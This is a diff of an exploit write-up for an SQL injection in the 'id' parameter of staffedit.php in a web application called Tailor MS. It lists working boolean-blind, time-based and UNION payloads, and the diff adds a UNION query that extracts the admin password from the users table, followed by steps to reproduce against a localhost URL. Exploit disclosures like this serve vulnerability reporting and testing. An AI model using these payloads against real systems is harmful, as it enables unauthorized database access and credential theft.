@@ -1,4 +1,4 @@
-# Exploit Title: Tailor MS – SQL Injection in staffedit.php (`http://localhost/tailor/staffedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in staffedit.php (`http://localhost:8000/staffedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +20,31 @@ A SQL Injection vulnerability exists in the `staffedit.php` endpoint of **Tailor
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/staffedit.php?id=1`
+- **URL:** `http://localhost:8000/staffedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `staffedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-  - **Payload:** `id=1' AND 6609=(SELECT (CASE WHEN (6609=6609) THEN 6609 ELSE (SELECT 4558 UNION SELECT 6635) END))-- -`
+  - **Payload:** `id=1' AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 1111 UNION SELECT 2222) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-  - **Payload:** `id=1' AND (SELECT 7587 FROM (SELECT(SLEEP(5)))XNbk)-- saKq`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 5 columns
-  - **Payload:** 
-```
-id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a7071,0x4d4b63774b48694c6b41775971475341456f4d47636f54544a6e48534e4f6375594e49615156504c,0x716a7a6271)-- -
-```
+  - **Payload:** `id=1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))abcd)-- efgh`
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password
+  - **Payload:**  
+    ```
+    http://localhost:8000/staffedit.php?id=-1' union select 1,2,3,4,5,password,7,8 from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +64,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/staffedit.php?id=1`.  
+1. Browse to `http://localhost:8000/staffedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `staffedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +74,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
